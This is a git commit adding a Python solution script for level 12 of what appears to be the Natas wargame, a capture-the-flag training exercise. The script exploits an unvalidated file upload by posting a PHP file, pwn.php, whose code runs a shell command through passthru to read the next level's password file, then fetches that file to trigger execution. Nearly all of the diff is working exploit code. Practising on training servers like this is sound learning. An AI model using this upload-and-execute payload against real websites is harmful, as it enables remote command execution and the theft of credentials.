a5758e44a65a54d1205b327f683b956e8c9ac7ec
Evan Johnson <evanj2357@gmail.com>
2021-06-21 14:01:19 -0700

    level solved!

--- solutions/natas12.py
+++ solutions/natas12.py
@@ -1,7 +1,10 @@
 """
+natas12: file upload without validation
 """
 
+import re
 import requests
+from bs4 import BeautifulSoup
 from typing import Optional
 
 from natas_utils import *
@@ -9,7 +12,24 @@ from natas_utils import *
 LEVEL = 12
 
 def solve(url: str, login: LevelLogin) -> Optional[str]:
-    return None
+    # The form allows file upload, but there's no file validation.
+    # Send PHP and see if the server will run it.
+    data = {
+        "filename": "pwn.php",
+    }
+    payload = {
+        "uploadedfile": f"<? passthru('cat {NATAS_DATA['flag_path']}natas{LEVEL}'); ?>",
+    }
+    response = requests.post(url, auth=login, data=data, files=payload)
+    response.raise_for_status()
+
+    page_content = BeautifulSoup(response.text, "html.parser").find("div", attrs={"id": "content"})
+    uploaded_payload_path = page_content.find("a", attrs={"href": re.compile(r'.php$')}).get("href")
+
+    response = requests.get(f"{url}/{uploaded_payload_path}", auth=login)
+
+    # the flag _should_ be the only text in the response, but test it to be sure
+    return try_level_login(LEVEL, extract_candidate_passwords(response.text, in_html_body=False))
 
 if __name__ == "__main__":
     url, login = load_level(LEVEL)
